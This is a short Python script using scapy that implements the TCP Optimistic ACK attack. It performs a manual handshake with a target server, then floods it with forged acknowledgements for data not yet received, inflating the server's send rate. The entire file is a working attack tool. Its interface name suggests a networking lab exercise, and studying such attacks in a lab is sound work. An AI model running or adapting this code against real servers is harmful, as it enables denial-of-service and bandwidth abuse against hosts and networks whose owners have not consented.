#!/usr/bin/env python
"""
This file implements the Optimistic Ack attack.
"""

import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description='Attack a TCP server with the optimistic ack attack.')
parser.add_argument('--dport', default=8000, type=int, help='The port to attack.')
parser.add_argument('--sport', default=8080, type=int, help='The port to send the TCP packets from.')
parser.add_argument('--host', default='127.0.0.1', type=str, help='The ip address to attack.')
args = parser.parse_args()

INIT_SEQ_NO = 12345
ACK_SPACING = 100000

if __name__ == "__main__":
    
    print "Starting three-way handshake..."
    ip_header = IP(dst=args.host) # An IP header that will take packets to the target machine.
    seq_no = INIT_SEQ_NO # Our starting sequence number

    syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', seq=seq_no) # Construct a SYN packet.
    synack = sr1(syn) # Send the SYN packet and receive a SYNACK
    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(seq_no + 1)) # ACK the SYNACK
    data = sr1(ack) # Send the ack and get the first data packet.

    print "First data packet arrived. Sending optimistic acks."

    socket = conf.L2socket(iface='client-eth0') 
    OPT_ACK_START = data.seq 
    PACKET_SIZE = len(data.payload.payload)
    for i in range(1, int(ACK_SPACING / PACKET_SIZE)):
        opt_ack = Ether() / ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * PACKET_SIZE), seq=(seq_no + 1))
        socket.send(opt_ack)
